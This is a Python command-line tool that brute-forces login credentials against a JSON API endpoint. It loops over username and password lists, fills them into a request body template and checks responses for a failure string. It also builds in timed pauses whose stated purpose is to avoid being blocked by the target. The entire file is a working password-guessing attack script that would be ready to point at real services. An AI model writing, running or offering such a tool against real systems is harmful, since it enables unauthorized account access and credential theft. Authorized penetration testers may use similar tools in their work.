import argparse
import requests
import time
from termcolor import colored

def brute_force_api(url, body_template, headers=None, username=None, usernames=None, password=None, passwords=None, failed_response=None, attempts=100, interval=3600):
    attempt_count = 0
    headers = headers or {}
    headers = dict(item.split(":", 1) for item in headers)
    
    for user in usernames or [username]:
        for pwd in passwords or [password]:
            # Enforce attempt limits
            if attempt_count >= attempts:
                print(colored(f"Reached {attempts} attempts. Waiting for {interval} seconds to avoid blocking.", "yellow"))
                time.sleep(interval)
                attempt_count = 0

            # Prepare the body
            body = body_template.replace("^USER^", user).replace("^PASS^", pwd)

            # Perform the request
            print(colored(f"Trying {user}:{pwd}", "cyan"))
            response = requests.post(url, data=body, headers=headers)
            attempt_count += 1

            # Check the response
            if failed_response in response.text:
                print(colored(f"Failed: {user}:{pwd}", "red"))
            else:
                print(colored(f"Success: {user}:{pwd}", "green"))
                return user, pwd
    return None, None

def main():
    parser = argparse.ArgumentParser(description="Brute force a JSON API endpoint.")
    parser.add_argument("-l", "--username", help="Single username to use.")
    parser.add_argument("-L", "--username-list", help="File containing list of usernames.")
    parser.add_argument("-p", "--password", help="Single password to use.")
    parser.add_argument("-P", "--password-list", help="File containing list of passwords.")
    parser.add_argument("--url", required=True, help="Complete URL of the API endpoint.")
    parser.add_argument("--headers", nargs="*", help="Headers to include in the request. Format: 'Key:Value'.")
    parser.add_argument("--body", required=True, help="Template of the POST request body. Use ^USER^ for username and ^PASS^ for password.")
    parser.add_argument("--failed-response", required=True, help="Part of the response that indicates a failed login.")
    parser.add_argument("--attempts", type=int, default=100, help="Number of attempts before pausing to avoid blocking.")
    parser.add_argument("--interval", type=int, default=3600, help="Time to wait (in seconds) after reaching the attempt limit.")

    args = parser.parse_args()

    # Validate mandatory username/password
    if not (args.username or args.username_list):
        parser.error("You must specify either --username (-l) or --username-list (-L).")
    if not (args.password or args.password_list):
        parser.error("You must specify either --password (-p) or --password-list (-P).")

    # Load username list if provided
    usernames = None
    if args.username_list:
        with open(args.username_list, "r", encoding="utf-8", errors="ignore") as f:
            usernames = [line.strip() for line in f]

    # Load password list if provided
    passwords = None
    if args.password_list:
        with open(args.password_list, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f]

    brute_force_api(
        url=args.url,
        body_template=args.body,
        headers=args.headers,
        username=args.username,
        usernames=usernames,
        password=args.password,
        passwords=passwords,
        failed_response=args.failed_response,
        attempts=args.attempts,
        interval=args.interval,
    )

if __name__ == "__main__":
    main()
